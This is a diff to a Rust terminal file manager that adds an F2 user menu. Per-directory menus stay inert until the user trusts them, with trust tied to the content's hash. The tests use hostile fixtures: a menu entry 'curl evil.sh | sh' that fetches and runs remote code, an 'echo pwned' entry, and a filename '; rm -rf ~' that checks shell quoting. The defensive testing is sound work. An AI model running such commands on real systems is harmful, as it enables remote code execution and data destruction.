@@ -157,6 +157,11 @@ pub(crate) enum Mode {
     Utilities {
         selected: usize,
     },
+    /// F2: the user's own commands. The menus themselves live on `App` — a
+    /// `Mode` is copied about and a parsed file is not something to copy.
+    UserMenu {
+        selected: usize,
+    },
     /// The directory history. Which of the three orders is showing lives on
     /// `App`, not here: it should survive closing and reopening the list.
     History {
@@ -231,6 +236,29 @@ struct Drag {
     anchor: usize,
     /// `true` for a right-button sweep.
     toggling: bool,
+}
+
+/// One row of the F2 menu, ready to draw.
+///
+/// Built when the menu opens and kept until it closes, so the drawing, the
+/// click and the pressed letter are all reading the same list. Two lists that
+/// can disagree about what is on screen is how a click runs the wrong command.
+#[derive(Debug, Clone)]
+pub(crate) struct MenuRow {
+    pub label: String,
+    pub hint: String,
+    pub separator: bool,
+    /// Shown, not choosable. A directory's menu before it is trusted is
+    /// exactly this: you can read what it offers, and nothing else.
+    pub inert: bool,
+    /// Which menu it came from and which entry, for when it is chosen.
+    pub from: Option<(MenuFrom, usize)>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum MenuFrom {
+    Global,
+    Directory,
 }
 
 /// The help page on its way in: the effect, the surface it draws on, and when
@@ -343,6 +371,18 @@ pub struct App {
     /// string in the next file is the common case.
     pub(crate) view_search: String,
     pub(crate) view_match: usize,
+    /// The user's own menu, and the one belonging to the directory in view.
+    ///
+    /// Both are re-read every time F2 is pressed rather than cached: a menu you
+    /// edited and have to restart to see is a menu you stop editing.
+    pub(crate) menu_global: Option<dmac_config::menu::Menu>,
+    pub(crate) menu_directory: Option<dmac_config::menu::Menu>,
+    /// Which directory menus have been approved, and what they said when they
+    /// were. Loaded once — it changes only when the user answers the question.
+    pub(crate) trust: dmac_config::menu::TrustStore,
+    /// The rows F2 is showing, built when it opens so that drawing, clicking
+    /// and pressing a letter cannot disagree about what is on screen.
+    pub(crate) menu_rows: Vec<MenuRow>,
     /// Full screen: the frame stripped off, leaving only contents on black.
     pub(crate) fullscreen: bool,
     /// Agents from the last run, waiting for an answer to "resume?".
@@ -581,6 +621,10 @@ impl App {
             document: None,
             view_search: String::new(),
             view_match: 0,
+            menu_global: None,
+            menu_directory: None,
+            trust: dmac_config::menu::TrustStore::load(),
+            menu_rows: Vec::new(),
             cursor_style: cursor,
             cursor_phase: std::time::Instant::now(),
             theme: Theme::default(),
@@ -1187,7 +1231,7 @@ impl App {
 
             // Everything below is claimed by the keymap but owned by an agent
             // that has not built it yet. Say so out loud rather than doing nothing.
-            UserMenu => self.status = "F2 user menu — not implemented yet".into(),
+            UserMenu => self.open_user_menu(),
             View => self.open_viewer(),
             Edit => self.edit_here(),
             Copy => self.status = self.pending_op("F5 copy"),
@@ -2636,6 +2680,7 @@ impl App {
             Mode::Picker { selected } => return self.picker_key(k, selected),
             Mode::Help { scroll } => return self.help_key(k, scroll),
             Mode::View { scroll, hex } => return self.view_key(k, scroll, hex),
+            Mode::UserMenu { selected } => return self.user_menu_key(k, selected),
             Mode::Context { selected, anchor } => return self.context_key(k, selected, anchor),
             Mode::Rail { selected } => return self.rail_key(k, selected),
             Mode::Prompt { intent } => return self.prompt_key(k, intent),
@@ -2976,7 +3021,320 @@ impl App {
         }
     }
 
-    /// The help page has the keyboard: scroll it, or close it.
+    // ---- F2, the user's own commands ----
+
+    /// F2: read both menus and show them.
+    ///
+    /// Re-read every time rather than cached. A menu you edited and have to
+    /// restart to see is a menu you stop editing, and the cost is two small
+    /// files off a local disk.
+    fn open_user_menu(&mut self) {
+        self.menu_global = dmac_config::menu::Menu::global().unwrap_or_else(|e| {
+            // A broken menu is worth saying out loud — silently having no
+            // commands is indistinguishable from never having written any.
+            self.status = format!("your menu: {e}");
+            None
+        });
+        let cwd = self.ses().cwd[Self::idx(self.ses().active)].clone();
+        self.menu_directory = match cwd.is_local() {
+            false => None,
+            true => dmac_config::menu::Menu::for_directory(cwd.as_path(), &self.trust)
+                .unwrap_or_else(|e| {
+                    self.status = format!("this directory's menu: {e}");
+                    None
+                }),
+        };
+
+        self.menu_rows = self.build_menu_rows();
+        // Empty means *nothing was written*, which is not the same as nothing
+        // being runnable: a directory menu awaiting trust is full of commands
+        // you can read, and telling that user to go and write some would be
+        // telling them the opposite of what is true.
+        let nothing = self
+            .menu_global
+            .as_ref()
+            .is_none_or(|m| m.entries.is_empty())
+            && self
+                .menu_directory
+                .as_ref()
+                .is_none_or(|m| m.entries.is_empty());
+        if nothing {
+            self.status = format!(
+                "no commands yet \u{2014} write some in ~/.config/dmac/menu.toml or {}",
+                dmac_config::menu::DIRECTORY_MENU
+            );
+            return;
+        }
+        // Onto the first row that can actually be chosen.
+        let first = self
+            .menu_rows
+            .iter()
+            .position(|r| r.from.is_some() && !r.inert)
+            .unwrap_or(0);
+        self.mode = Mode::UserMenu { selected: first };
+    }
+
+    /// The rows, in the order they are drawn: yours, then the directory's.
+    ///
+    /// A letter used by both belongs to the directory's — it is the more
+    /// specific answer — and the one it displaces is marked rather than hidden.
+    /// Silently dropping a command from your own menu because a repository you
+    /// cloned happens to use that letter is exactly the surprise this whole
+    /// area exists to avoid.
+    fn build_menu_rows(&self) -> Vec<MenuRow> {
+        use dmac_config::menu::Source;
+        let mut rows = Vec::new();
+        let dir_keys: Vec<char> = match self.menu_directory.as_ref() {
+            Some(m) if m.source.runnable() => m.entries.iter().map(|e| e.key).collect(),
+            _ => Vec::new(),
+        };
+
+        if let Some(global) = self.menu_global.as_ref() {
+            for (i, e) in global.entries.iter().enumerate() {
+                let shadowed = dir_keys.iter().any(|k| k.eq_ignore_ascii_case(&e.key));
+                rows.push(MenuRow {
+                    label: match shadowed {
+                        true => format!("{}  (this directory uses {})", e.title, e.key),
+                        false => e.title.clone(),
+                    },
+                    hint: e.key.to_string(),
+                    separator: false,
+                    inert: shadowed,
+                    from: (!shadowed).then_some((MenuFrom::Global, i)),
+                });
+            }
+        }
+
+        let Some(dir) = self.menu_directory.as_ref() else {
+            return rows;
+        };
+        if !rows.is_empty() {
+            rows.push(MenuRow {
+                label: String::new(),
+                hint: String::new(),
+                separator: true,
+                inert: true,
+                from: None,
+            });
+        }
+        let runnable = dir.source.runnable();
+        for (i, e) in dir.entries.iter().enumerate() {
+            rows.push(MenuRow {
+                label: e.title.clone(),
+                // No accelerator printed beside something that will not answer:
+                // a hint on a blocked row is a lie about what the key does.
+                hint: match runnable {
+                    true => e.key.to_string(),
+                    false => String::new(),
+                },
+                separator: false,
+                inert: !runnable,
+                from: runnable.then_some((MenuFrom::Directory, i)),
+            });
+        }
+        if !runnable && let Source::Directory { .. } = &dir.source {
+            rows.push(MenuRow {
+                label: String::new(),
+                hint: String::new(),
+                separator: true,
+                inert: true,
+                from: None,
+            });
+            rows.push(MenuRow {
+                label: format!(
+                    "this directory carries {} command(s) \u{2014} T to trust it",
+                    dir.entries.len()
+                ),
+                hint: "T".into(),
+                separator: false,
+                inert: true,
+                from: None,
+            });
+        }
+        rows
+    }
+
+    /// Driving F2.
+    fn user_menu_key(&mut self, k: KeyEvent, selected: usize) {
+        let n = self.menu_rows.len();
+        let step = |from: usize, by: isize| -> usize {
+            // Over separators and over anything that cannot be chosen: a cursor
+            // resting on a row that does nothing is a cursor you press Enter on
+            // for no reason.
+            let mut at = from as isize;
+            for _ in 0..n.max(1) {
+                at = (at + by).rem_euclid(n.max(1) as isize);
+                if self
+                    .menu_rows
+                    .get(at as usize)
+                    .is_some_and(|r| r.from.is_some())
+                {
+                    break;
+                }
+            }
+            at as usize
+        };
+        match k.code {
+            KeyCode::Esc | KeyCode::F(2) | KeyCode::F(10) => self.mode = Mode::Normal,
+            KeyCode::Up => {
+                self.mode = Mode::UserMenu {
+                    selected: step(selected, -1),
+                }
+            }
+            KeyCode::Down => {
+                self.mode = Mode::UserMenu {
+                    selected: step(selected, 1),
+                }
+            }
+            KeyCode::Enter => self.choose_menu_row(selected),
+            KeyCode::Char('T') => self.trust_directory_menu(),
+            KeyCode::Char(c) => {
+                if let Some(row) = self
+                    .menu_rows
+                    .iter()
+                    .position(|r| r.from.is_some() && r.hint.starts_with(c.to_ascii_lowercase()))
+                {
+                    self.choose_menu_row(row);
+                }
+            }
+            _ => {}
+        }
+    }
+
+    /// Approve the directory menu that is on screen.
+    ///
+    /// Against its *content*, so the next `git pull` asks again. Approving a
+    /// path once and then running whatever arrives in it later is the failure
+    /// the whole trust mechanism exists to prevent.
+    fn trust_directory_menu(&mut self) {
+        use dmac_config::menu::Source;
+        let Some(Source::Directory { path, .. }) =
+            self.menu_directory.as_ref().map(|m| m.source.clone())
+        else {
+            return;
+        };
+        let Ok(text) = std::fs::read_to_string(&path) else {
+            self.status = format!("{} could not be read", path.display());
+            return;
+        };
+        match self.trust.trust(&path, &text) {
+            Ok(()) => {
+                self.status = format!("trusted {}", path.display());
+                // Re-read, so what is on screen is the approved thing rather
+                // than the blocked drawing of it.
+                self.open_user_menu();
+            }
+            Err(e) => self.status = format!("could not record that: {e}"),
+        }
+    }
+
+    /// Run whatever is on this row.
+    fn choose_menu_row(&mut self, row: usize) {
+        let Some(from) = self.menu_rows.get(row).and_then(|r| r.from) else {
+            return;
+        };
+        let entry = match from {
+            (MenuFrom::Global, i) => self.menu_global.as_ref().and_then(|m| m.entries.get(i)),
+            (MenuFrom::Directory, i) => self.menu_directory.as_ref().and_then(|m| m.entries.get(i)),
+        };
+        let Some(entry) = entry.cloned() else {
+            return;
+        };
+        self.mode = Mode::Normal;
+        self.run_menu_entry(&entry);
+    }
+
+    /// What the placeholders mean, right now.
+    ///
+    /// Built from the panels at the moment the command is chosen rather than
+    /// when the menu opened: the two are usually the same instant, and when
+    /// they are not, what the user is looking at is what they meant.
+    fn menu_values(&self, name: &str) -> Option<Vec<String>> {
+        let session = self.ses();
+        let i = Self::idx(session.active);
+        let here = &session.cwd[i];
+        let there = &session.cwd[1 - i];
+        let current = session.panels[i].current();
+        let operands: Vec<String> = session.panels[i]
+            .operands()
+            .iter()
+            .map(|e| e.name.clone())
+            .collect();
+        let full = |n: &str| here.as_path().join(n).display().to_string();
+
+        match name {
+            "name" => current.map(|e| vec![e.name.clone()]),
+            "path" => current.map(|e| vec![full(&e.name)]),
+            "stem" => current.map(|e| {
+                let n = &e.name;
+                vec![n.rsplit_once('.').map_or(n.clone(), |(s, _)| s.to_string())]
+            }),
+            "ext" => current.map(|e| {
+                vec![
+                    e.name
+                        .rsplit_once('.')
+                        .map_or(String::new(), |(_, x)| x.to_string()),
+                ]
+            }),
+            "names" => Some(operands),
+            "paths" => Some(operands.iter().map(|n| full(n)).collect()),
+            "dir" => Some(vec![here.as_path().display().to_string()]),
+            "other" => Some(vec![there.as_path().display().to_string()]),
+            _ => None,
+        }
+    }
+
+    /// Expand a command and put it in the shell.
+    ///
+    /// Written into the hosted shell rather than spawned out of sight: you see
+    /// what ran, the output goes where output goes, and it inherits the shell's
+    /// own environment and directory. `confirm` decides whether Enter is
+    /// pressed for you — and on an entry that deletes something, seeing the
+    /// substituted line first is exactly when a surprising filename shows
+    /// itself.
+    fn run_menu_entry(&mut self, entry: &dmac_config::menu::Entry) {
+        let line = match dmac_config::menu::expand(&entry.run, &|n| self.menu_values(n)) {
+            Ok(line) => line,
+            Err(e) => {
+                self.status = format!("{}: {e}", entry.title);
+                return;
+            }
+        };
+        let waker = self.waker();
+        let (cols, rows) = self.shell_size();
+        let confirm = entry.confirm;
+        let title = entry.title.clone();
+        let session = self.sessions.current_mut();
+        let shell = match session.shell(cols, rows, waker) {
+            Ok(shell) => shell,
+            Err(e) => {
+                self.status = format!("no shell to run it in: {e}");
+                return;
+            }
+        };
+        // Into a prompt or not at all. A line typed at something already
+        // running is not a command, it is a sentence handed to whatever has the
+        // keyboard.
+        if !shell.at_prompt() {
+            self.status = format!("the shell here is busy \u{2014} {title} not run");
+            return;
+        }
+        let wrote = match confirm {
+            true => shell.write(line.as_bytes()),
+            false => shell.run(&line),
+        };
+        match wrote {
+            Ok(()) => {
+                session.view = View::Shell;
+                self.status = match confirm {
+                    true => format!("{title} \u{2014} read it, then press Enter"),
+                    false => title,
+                };
+            }
+            Err(e) => self.status = format!("could not run {title}: {e}"),
+        }
+    }
+
     /// F3: show the file under the cursor.
     ///
     /// The whole file is read here rather than on a task, which is a deliberate
@@ -3140,6 +3498,7 @@ impl App {
         );
     }
 
+    /// The help page has the keyboard: scroll it, or close it.
     fn help_key(&mut self, k: KeyEvent, scroll: usize) {
         // Impatience is a legitimate answer to an animation, and a key that
         // only cancels one is a key that did not do what it says. So the page
@@ -4185,7 +4544,20 @@ impl App {
         let session = self.sessions.current_mut();
         let id = session.id.0.to_string();
         let conversation = session.conversation_id().to_string();
-        let line = dmac_session::agent::start_command(&id, &conversation, "");
+        // A session opened beside another starts *in* the mother's history and
+        // then diverges — which is what "beside" has to mean, or the second
+        // agent has to be told the problem all over again. Only on its first
+        // start: once its own conversation exists, coming back to it is an
+        // ordinary resume, and forking again would branch a fresh one every
+        // time.
+        let fork = session
+            .parent_conversation
+            .clone()
+            .filter(|_| session.agent.is_none());
+        let line = match fork {
+            Some(_) => dmac_session::agent::fork_command(&id, ""),
+            None => dmac_session::agent::start_command(&id, &conversation, ""),
+        };
         let shell = match session.shell(cols, rows, waker) {
             Ok(shell) => shell,
             Err(e) => {
@@ -5194,6 +5566,154 @@ mod tests {
         app.on_key(key(KeyCode::Char('d')));
         assert_eq!(app.sessions.len(), 1, "the children stayed behind");
         assert!(app.status.contains('3'), "how many went: {}", app.status);
+    }
+
+    // ---- F2, the user menu ----
+
+    /// A session looking at a directory that carries its own menu.
+    fn with_directory_menu(body: &str) -> (App, std::path::PathBuf) {
+        let dir = std::env::temp_dir().join(format!(
+            "dmac-menu-{}-{:?}",
+            std::process::id(),
+            std::thread::current().id()
+        ));
+        std::fs::create_dir_all(&dir).expect("scratch");
+        let menu = dir.join(dmac_config::menu::DIRECTORY_MENU);
+        std::fs::write(&menu, body).expect("write");
+
+        let mut app = fixture();
+        app.ses_mut().cwd[0] = VfsPath::local(&dir);
+        // A trust store of our own: a test must never read or write the real
+        // one, and must never inherit an answer the user gave last week.
+        app.trust = dmac_config::menu::TrustStore::at(dir.join("trusted.toml"));
+        (app, menu)
+    }
+
+    const DIR_MENU: &str = r#"
+[[entry]]
+key = "x"
+title = "something the repository wants"
+run = "echo pwned"
+"#;
+
+    /// The heart of it. A directory's menu is *shown* and does not run, until
+    /// the person sitting there says it may. Without this, cloning a repository
+    /// and pressing F2 out of habit runs whatever its author wrote.
+    #[test]
+    fn a_directory_menu_is_visible_and_inert_until_it_is_trusted() {
+        let (mut app, path) = with_directory_menu(DIR_MENU);
+        app.on_key(key(KeyCode::F(2)));
+        assert!(matches!(app.mode, Mode::UserMenu { .. }), "{:?}", app.mode);
+
+        // Listed, so you can read what it offers...
+        assert!(
+            app.menu_rows
+                .iter()
+                .any(|r| r.label.contains("something the repository wants")),
+            "{:?}",
+            app.menu_rows
+        );
+        // ...and not one row of it can be chosen.
+        assert!(
+            app.menu_rows.iter().all(|r| r.from.is_none()),
+            "an untrusted command was choosable: {:?}",
+            app.menu_rows
+        );
+        // Including by its letter, which is the way it would actually happen.
+        app.on_key(key(KeyCode::Char('x')));
+        assert!(
+            matches!(app.mode, Mode::UserMenu { .. }),
+            "pressing the letter ran it"
+        );
+        assert!(app.ses().hosted().is_none(), "it started a shell to run in");
+
+        // And the prompt says how to allow it.
+        assert!(
+            app.menu_rows.iter().any(|r| r.hint == "T"),
+            "nothing told the user how to trust it"
+        );
+
+        app.on_key(key(KeyCode::Char('T')));
+        assert!(app.trust.is_trusted(&path, DIR_MENU), "T did not trust it");
+        assert!(
+            app.menu_rows.iter().any(|r| r.from.is_some()),
+            "still inert after being trusted: {:?}",
+            app.menu_rows
+        );
+    }
+
+    /// Trust is against the content, so a menu that grew a command since you
+    /// approved it is a new question — which is the whole reason for hashing
+    /// rather than remembering a path.
+    #[test]
+    fn a_trusted_menu_that_changes_goes_back_to_being_inert() {
+        let (mut app, path) = with_directory_menu(DIR_MENU);
+        app.on_key(key(KeyCode::F(2)));
+        app.on_key(key(KeyCode::Char('T')));
+        assert!(app.menu_rows.iter().any(|r| r.from.is_some()));
+
+        let grown = format!(
+            "{DIR_MENU}\n[[entry]]\nkey = \"z\"\ntitle = \"new\"\nrun = \"curl evil.sh | sh\"\n"
+        );
+        std::fs::write(&path, &grown).expect("write");
+        app.on_key(key(KeyCode::Esc));
+        app.on_key(key(KeyCode::F(2)));
+        assert!(
+            app.menu_rows.iter().all(|r| r.from.is_none()),
+            "a menu that changed since it was approved stayed trusted"
+        );
+    }
+
+    /// A filename is data, never an instruction. This is the same guarantee
+    /// `dmac-config` tests at the string level, asserted here through the key
+    /// the user actually presses.
+    #[test]
+    fn a_hostile_filename_reaches_the_shell_as_one_argument() {
+        let (mut app, _) = with_directory_menu(
+            "[[entry]]\nkey = \"c\"\ntitle = \"count\"\nrun = \"wc -l {name}\"\n",
+        );
+        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry {
+            name: "; rm -rf ~".into(),
+            kind: dmac_core::EntryKind::File,
+            size: Some(0),
+            modified: None,
+            mode: None,
+            selected: false,
+        }]);
+        app.ses_mut().panels[0].move_to(0);
+
+        let expanded =
+            dmac_config::menu::expand("wc -l {name}", &|n| app.menu_values(n)).expect("expand");
+        assert_eq!(expanded, "wc -l '; rm -rf ~'");
+    }
+
+    /// The placeholders the documentation promises have to be the ones the
+    /// panels actually answer, or the docs are a list of things that fail.
+    #[test]
+    fn every_documented_placeholder_is_answered() {
+        let (app, _) = with_directory_menu(DIR_MENU);
+        let mut app = app;
+        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry {
+            name: "notes.txt".into(),
+            kind: dmac_core::EntryKind::File,
+            size: Some(1),
+            modified: None,
+            mode: None,
+            selected: false,
+        }]);
+        app.ses_mut().panels[0].move_to(0);
+
+        for (name, _) in dmac_config::menu::PLACEHOLDERS {
+            let got = app.menu_values(name);
+            assert!(got.is_some(), "{{{name}}} is documented and unanswered");
+            assert!(
+                got.as_ref().is_some_and(|v| !v.is_empty()),
+                "{{{name}}} answered with nothing"
+            );
+        }
+        assert_eq!(app.menu_values("nonsense"), None);
+        assert_eq!(app.menu_values("stem"), Some(vec!["notes".to_string()]));
+        assert_eq!(app.menu_values("ext"), Some(vec!["txt".to_string()]));
     }
 
     // ---- F3, the viewer ----
